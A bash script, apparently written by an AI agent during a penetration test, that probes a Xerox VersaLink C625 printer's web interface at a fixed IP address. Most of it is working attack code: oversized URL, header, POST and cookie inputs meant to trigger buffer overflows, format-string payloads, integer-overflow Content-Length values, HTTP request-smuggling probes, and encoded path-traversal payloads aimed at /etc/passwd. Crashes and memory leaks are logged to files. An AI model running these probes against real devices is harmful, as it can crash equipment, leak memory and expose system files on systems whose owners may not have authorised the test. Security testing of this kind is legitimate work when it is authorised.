#!/bin/bash
# Memory/Buffer Overflow Attack Testing - Xerox VersaLink C625 @ 13.13.1.110
# Test for crashes, memory corruption, and buffer overflows via HTTP
# NO DoS (single requests, not floods), NO brute force

TARGET="13.13.1.110"
PROXY="127.0.0.1:34153"
OUTDIR="/tmp/claude-0/-home-user-poc/7cd1a7e6-f110-5076-9299-6360885c3a0d/scratchpad/memory_results"
mkdir -p "$OUTDIR"

fetch_raw() {
  local raw_request="$1"
  (echo -e "$raw_request"; sleep 3) | \
    timeout 20 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_get() {
  local path="$1"
  (echo -e "GET $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_post() {
  local path="$1"
  local body="$2"
  local content_type="${3:-application/x-www-form-urlencoded}"
  local len=${#body}
  (echo -e "POST $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: $content_type\r\nContent-Length: $len\r\n\r\n$body"; sleep 3) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

echo "================================================================"
echo "  MEMORY / BUFFER OVERFLOW ATTACK TESTING"
echo "  Target: $TARGET (Xerox VersaLink C625)"
echo "  Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "  Note: Single requests only, no flooding"
echo "================================================================"

###############################################################################
# TEST M1: Oversized URL path
###############################################################################
echo ""
echo "[TEST M1] Oversized URL Path Buffer Overflow"
echo "================================================"

for size in 256 512 1024 2048 4096 8192; do
  path="/$(python3 -c "print('A'*$size)")"
  resp=$(fetch_get "$path" 2>/dev/null)
  status=$(echo "$resp" | head -1)
  resp_len=$(echo "$resp" | wc -c)
  if [ "$resp_len" -lt 10 ]; then
    echo "  [!] NO RESPONSE for path length $size - possible crash!"
    echo "NO_RESPONSE" > "$OUTDIR/m1_url_${size}.txt"
  else
    echo "  [*] Path length $size: $status (${resp_len} bytes response)"
    echo "$resp" | head -5 > "$OUTDIR/m1_url_${size}.txt"
  fi
done

###############################################################################
# TEST M2: Oversized HTTP Headers
###############################################################################
echo ""
echo "[TEST M2] Oversized HTTP Header Values"
echo "================================================"

HEADERS_TO_TEST=(
  "User-Agent"
  "Cookie"
  "Referer"
  "Accept-Language"
  "X-Forwarded-For"
  "Authorization"
)

for hdr in "${HEADERS_TO_TEST[@]}"; do
  for size in 256 512 1024 2048 4096 8192; do
    val=$(python3 -c "print('A'*$size)")
    resp=$(fetch_raw "GET /stat/welcome.php HTTP/1.1\r\nHost: $TARGET\r\n${hdr}: ${val}\r\nConnection: close\r\n\r\n" 2>/dev/null)
    resp_len=$(echo "$resp" | wc -c)
    status=$(echo "$resp" | head -1)
    if [ "$resp_len" -lt 10 ]; then
      echo "  [!] NO RESPONSE for ${hdr} length $size - possible crash!"
      echo "NO_RESPONSE" > "$OUTDIR/m2_${hdr}_${size}.txt"
    elif echo "$status" | grep -qi "500\|502\|503"; then
      echo "  [!] SERVER ERROR for ${hdr} length $size: $status"
      echo "$resp" | head -10 > "$OUTDIR/m2_${hdr}_${size}.txt"
    else
      echo "  [*] ${hdr} length $size: $status"
    fi
  done
done

###############################################################################
# TEST M3: Oversized POST parameters
###############################################################################
echo ""
echo "[TEST M3] Oversized POST Body Parameters"
echo "================================================"

CSRF_TOKEN=$(fetch_get "/stat/welcome.php" 2>/dev/null | grep -oP '[a-f0-9]{64,}' | head -1)

POST_ENDPOINTS=(
  "/dummypost/xerox.set"
  "/print/print.php"
  "/ajax/activityAjaxHandler.php"
)

for ep in "${POST_ENDPOINTS[@]}"; do
  for size in 256 1024 4096 8192 16384; do
    param_val=$(python3 -c "print('B'*$size)")
    body="CSRFToken=${CSRF_TOKEN}&_fun_function=${param_val}"
    resp=$(fetch_post "$ep" "$body" 2>/dev/null)
    resp_len=$(echo "$resp" | wc -c)
    status=$(echo "$resp" | head -1)
    if [ "$resp_len" -lt 10 ]; then
      echo "  [!] NO RESPONSE at ${ep} with param size $size - possible crash!"
      echo "NO_RESPONSE" > "$OUTDIR/m3_$(echo $ep | tr '/' '_')_${size}.txt"
    elif echo "$status" | grep -qi "500\|502\|503"; then
      echo "  [!] SERVER ERROR at ${ep} with param size $size: $status"
      echo "$resp" | head -15 > "$OUTDIR/m3_$(echo $ep | tr '/' '_')_${size}.txt"
    else
      echo "  [*] ${ep} param size $size: $status"
    fi
  done
done

###############################################################################
# TEST M4: Format String Attacks via HTTP
###############################################################################
echo ""
echo "[TEST M4] Format String Injection"
echo "================================================"

FMTSTR_PAYLOADS=(
  '%s%s%s%s%s%s%s%s%s%s'
  '%p%p%p%p%p%p%p%p'
  '%x%x%x%x%x%x%x%x'
  '%n%n%n%n'
  'AAAA%08x.%08x.%08x.%08x'
  '%s'
  '%d%d%d%d%d%d%d%d%d%d'
  '%.9999999s'
  '%99999999s'
)

FMTSTR_POINTS=(
  "/stat/welcome.php?tab="
  "/webglue/content?c="
  "/print/print.php?jobname="
  "/ajax/activityAjaxHandler.php?action="
)

for ep in "${FMTSTR_POINTS[@]}"; do
  for payload in "${FMTSTR_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    resp=$(fetch_get "${ep}${encoded}" 2>/dev/null)
    resp_len=$(echo "$resp" | wc -c)
    status=$(echo "$resp" | head -1)
    if [ "$resp_len" -lt 10 ]; then
      echo "  [!] NO RESPONSE at ${ep} with fmt payload '$payload' - possible crash!"
      echo "NO_RESPONSE" > "$OUTDIR/m4_fmtstr_$(echo "${ep}${payload}" | md5sum | cut -c1-8).txt"
    elif echo "$resp" | grep -qP '0x[0-9a-f]{6,}|[0-9a-f]{8}\.[0-9a-f]{8}'; then
      echo "  [!] FORMAT STRING LEAK at ${ep}"
      echo "      Payload: $payload"
      echo "      Leaked: $(echo "$resp" | grep -oP '0x[0-9a-f]{6,}|[0-9a-f]{8}\.[0-9a-f]{8}' | head -3)"
      echo "$resp" > "$OUTDIR/m4_fmtstr_vuln_$(echo "${ep}${payload}" | md5sum | cut -c1-8).txt"
    fi
  done
done

# Format string in POST parameters
for payload in "${FMTSTR_PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
  body="CSRFToken=${CSRF_TOKEN}&_fun_function=${encoded}"
  resp=$(fetch_post "/dummypost/xerox.set" "$body" 2>/dev/null)
  resp_len=$(echo "$resp" | wc -c)
  if [ "$resp_len" -lt 10 ]; then
    echo "  [!] NO RESPONSE on POST fmt payload '$payload'"
  elif echo "$resp" | grep -qP '0x[0-9a-f]{6,}'; then
    echo "  [!] FORMAT STRING LEAK in POST"
    echo "      Payload: $payload"
    echo "$resp" > "$OUTDIR/m4_fmtstr_post_$(echo "$payload" | md5sum | cut -c1-8).txt"
  fi
done

echo "[+] Format string testing complete"

###############################################################################
# TEST M5: Integer Overflow in Content-Length
###############################################################################
echo ""
echo "[TEST M5] Integer Overflow via Content-Length"
echo "================================================"

INT_VALUES=(
  "0"
  "-1"
  "4294967295"
  "4294967296"
  "2147483647"
  "2147483648"
  "-2147483648"
  "999999999999"
  "18446744073709551615"
)

for val in "${INT_VALUES[@]}"; do
  resp=$(fetch_raw "POST /dummypost/xerox.set HTTP/1.1\r\nHost: $TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${val}\r\nConnection: close\r\n\r\ntest=1" 2>/dev/null)
  status=$(echo "$resp" | head -1)
  resp_len=$(echo "$resp" | wc -c)
  if [ "$resp_len" -lt 10 ]; then
    echo "  [!] NO RESPONSE for Content-Length: $val - possible crash!"
  elif echo "$status" | grep -qi "500\|502\|503"; then
    echo "  [!] SERVER ERROR for Content-Length: $val - $status"
    echo "$resp" | head -10 > "$OUTDIR/m5_cl_${val}.txt"
  else
    echo "  [*] Content-Length: $val -> $status"
  fi
done

###############################################################################
# TEST M6: Malformed HTTP Requests
###############################################################################
echo ""
echo "[TEST M6] Malformed HTTP Request Handling"
echo "================================================"

# Null bytes in various positions
resp=$(fetch_raw "GET /stat/welcome.php%00.bak HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\n\r\n" 2>/dev/null)
status=$(echo "$resp" | head -1)
echo "  [*] Null byte in URL: $status"
echo "$resp" > "$OUTDIR/m6_nullbyte_url.txt"

# HTTP method overflow
resp=$(fetch_raw "$(python3 -c "print('A'*500)") /stat/welcome.php HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\n\r\n" 2>/dev/null)
resp_len=$(echo "$resp" | wc -c)
if [ "$resp_len" -lt 10 ]; then
  echo "  [!] NO RESPONSE for oversized HTTP method"
else
  echo "  [*] Oversized HTTP method: $(echo "$resp" | head -1)"
fi

# Double Content-Length (HTTP request smuggling probe)
resp=$(fetch_raw "POST /dummypost/xerox.set HTTP/1.1\r\nHost: $TARGET\r\nContent-Length: 10\r\nContent-Length: 0\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\ntest=12345" 2>/dev/null)
echo "  [*] Double Content-Length: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/m6_double_cl.txt"

# Transfer-Encoding + Content-Length (smuggling)
resp=$(fetch_raw "POST /dummypost/xerox.set HTTP/1.1\r\nHost: $TARGET\r\nTransfer-Encoding: chunked\r\nContent-Length: 10\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n0\r\n\r\n" 2>/dev/null)
echo "  [*] TE+CL smuggling probe: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/m6_te_cl.txt"

# Malformed HTTP version
resp=$(fetch_raw "GET /stat/welcome.php HTTP/9.9\r\nHost: $TARGET\r\nConnection: close\r\n\r\n" 2>/dev/null)
echo "  [*] HTTP/9.9: $(echo "$resp" | head -1)"

resp=$(fetch_raw "GET /stat/welcome.php HTTP/1.$(python3 -c "print('1'*100)") \r\nHost: $TARGET\r\nConnection: close\r\n\r\n" 2>/dev/null)
resp_len=$(echo "$resp" | wc -c)
echo "  [*] Oversized HTTP version: $(echo "$resp" | head -1) (${resp_len} bytes)"

# Many headers
MANY_HEADERS=""
for i in $(seq 1 100); do
  MANY_HEADERS="${MANY_HEADERS}X-Custom-${i}: $(python3 -c "print('A'*50)")\r\n"
done
resp=$(fetch_raw "GET /stat/welcome.php HTTP/1.1\r\nHost: $TARGET\r\n${MANY_HEADERS}Connection: close\r\n\r\n" 2>/dev/null)
resp_len=$(echo "$resp" | wc -c)
if [ "$resp_len" -lt 10 ]; then
  echo "  [!] NO RESPONSE with 100 custom headers"
else
  echo "  [*] 100 custom headers: $(echo "$resp" | head -1)"
fi

###############################################################################
# TEST M7: Cookie overflow
###############################################################################
echo ""
echo "[TEST M7] Cookie Buffer Overflow"
echo "================================================"

for size in 256 1024 4096 8192 16384; do
  cookie_val=$(python3 -c "print('C'*$size)")
  resp=$(fetch_raw "GET /stat/welcome.php HTTP/1.1\r\nHost: $TARGET\r\nCookie: PHPSESSID=${cookie_val}\r\nConnection: close\r\n\r\n" 2>/dev/null)
  resp_len=$(echo "$resp" | wc -c)
  status=$(echo "$resp" | head -1)
  if [ "$resp_len" -lt 10 ]; then
    echo "  [!] NO RESPONSE for cookie size $size - possible crash!"
  elif echo "$status" | grep -qi "500\|502\|503"; then
    echo "  [!] SERVER ERROR for cookie size $size: $status"
  else
    echo "  [*] Cookie size $size: $status"
  fi
done

# Multiple cookies
MULTI_COOKIE=""
for i in $(seq 1 50); do
  MULTI_COOKIE="${MULTI_COOKIE}cookie${i}=$(python3 -c "print('D'*100)"); "
done
resp=$(fetch_raw "GET /stat/welcome.php HTTP/1.1\r\nHost: $TARGET\r\nCookie: ${MULTI_COOKIE}\r\nConnection: close\r\n\r\n" 2>/dev/null)
resp_len=$(echo "$resp" | wc -c)
echo "  [*] 50 cookies response: $(echo "$resp" | head -1) (${resp_len} bytes)"

###############################################################################
# TEST M8: Unicode / encoding edge cases
###############################################################################
echo ""
echo "[TEST M8] Unicode & Encoding Edge Cases"
echo "================================================"

UNICODE_PAYLOADS=(
  "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
  "..%c0%af..%c0%af..%c0%afetc/passwd"
  "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
  "%ef%bc%8f%ef%bc%8f%ef%bc%8fetc%ef%bc%8fpasswd"
)

for payload in "${UNICODE_PAYLOADS[@]}"; do
  resp=$(fetch_get "/$payload" 2>/dev/null)
  if echo "$resp" | grep -q "root:.*:0:0:"; then
    echo "  [!!] UNICODE PATH TRAVERSAL: $payload"
    echo "$resp" > "$OUTDIR/m8_unicode_pt.txt"
  fi
  resp_len=$(echo "$resp" | wc -c)
  status=$(echo "$resp" | head -1)
  echo "  [*] $payload: $status"
done

echo ""
echo "================================================================"
echo "  MEMORY ATTACK TESTING COMPLETE"
echo "  Results saved to: $OUTDIR/"
echo "================================================================"
